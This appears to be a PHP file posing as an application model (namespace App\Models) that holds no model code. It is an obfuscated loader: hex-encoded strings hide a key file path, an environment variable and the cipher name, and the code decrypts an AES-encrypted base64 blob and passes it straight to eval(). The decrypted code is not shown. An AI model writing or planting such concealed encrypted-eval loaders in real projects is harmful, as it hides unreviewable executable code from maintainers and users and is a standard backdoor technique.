<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Mu4XYCggXtdO7iKn7NRXgw==');

$c=base64_decode(

'gW7FUgZ42q8QEwO8EnT44RWGh621onukxbLPiIKDXNbcqO39zZsdLj8tRupXYs0waXlI99RdiOIg' .
'X9hoff4+CaeO8FqfNzpIUnyHNsyEp7XxR9Cubr3+KSHVYLRIfNoU05ZCKXEPORZfl/22CrO+vHJB' .
'8YgcTpei4w6+avjlgXia2JmWaLp364G8ALHvLTpJ/5ggnGJRFP1dJIkGu1xmzuM8LI3RbqnYEII/' .
'3+EvtyFyRSUiPkpEhd1nUi9gtPg74jHiKXZLqu+wF4rpioRt8ZHerMCFPXNgeHyayh2qiVa9WVVZ' .
'qNpIjhp7tp4t6s8Q6gMwdlseE7ZDPdEZUweDuABwQupyxbsGAIzlw/Lg9FNekiaeyY2RqeamowvO' .
'RjAx2BT5RXBJc53YjeHRHX7tyoY8ej1OyUbo2XPmN6J/vs0mSU3vCf5miC7EvEut6Xif/8qr9vxZ' .
'wfQumEaJhnKVaqMLII/AkeXAe0hiri0P7mJrxbVdEPSl6a9D7GG32ghaEuJLHKNyAfVLHtnfzQ2a' .
'6EqR6j7Hp/5rNsa+ufEIb1cDITgaDvi/FfE8WcCeh8rj+6FbkFkbyJCiRuKzyISnnUggWgsmokzn' .
'qYct3bBe6W/4hI5yztx4ol75Y9BhKaLkfyN+Rjxd3Whb7MEyC4YW9W9jPpChi/pxyK9A2a/sCZME' .
'j4w6msps7o5mmdC3gtkK/A/Q6RO/7fe+0XblPuWhZoLLnkmDDUb8O6wcG2JZ9hFQqc7imXwayUbz' .
'YV/O0EwuinnsMRPWNRWqhiO1lGSn89t0LTCDJQ96tf/k5bnz1DwSfpfEKWAUIwYPSpyJjLPGFus3' .
'VClT3+Jlu8iJ8ugzx9FJjA9OdTdmxnL6kiifzV3kQCIDFcQ+Fax46HNf0cW2'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

